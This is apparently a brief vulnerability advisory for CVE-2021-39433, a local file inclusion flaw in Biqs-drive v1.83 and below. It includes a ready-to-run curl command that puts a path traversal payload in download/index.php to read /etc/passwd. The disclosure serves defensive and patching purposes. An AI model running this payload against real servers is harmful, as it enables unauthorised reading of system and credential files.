# CVE-2021-39433

A local file inclusion (LFI) vulnerability exists in version BIQS IT Biqs-drive v1.83 and below when sending a specific payload as the file parameter to download/index.php. This allows the attacker to read arbitrary files from the server with the permissions of the configured web-user.

`curl https://TARGET/download/index.php?file=../../../../../../../../../etc/passwd`
